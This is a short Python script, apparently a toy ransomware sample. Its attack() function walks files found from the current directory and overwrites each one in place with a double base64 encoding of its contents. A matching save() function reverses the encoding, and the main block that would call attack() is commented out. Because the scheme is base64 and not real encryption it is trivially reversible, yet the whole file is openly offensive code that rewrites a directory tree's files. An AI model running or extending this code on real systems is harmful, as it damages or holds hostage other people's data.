#coding: utf
import base64
import os
import traceback
import time
from findFiles import *

def encrypting(listFiles):
    for file in listFiles:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            with open(file,'wb') as f:
                f.write(base64.b64encode(base64.b64encode(content)))
        except:
            traceback.print_exc()

def decrypting(listFiles):
    for file in listFiles:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            with open(file,'wb') as f:
                f.write(base64.b64decode(base64.b64decode(content)))
        except:
            traceback.print_exc()
            
def attack():
    encrypting(findFilesFromHere())

def save():
    decrypting(findFilesFromHere())

# if __name__ == '__main__':
    # start = time.time()
    # attack()
    # end = time.time()
    # print 'It took {} seconds'.format(end - start)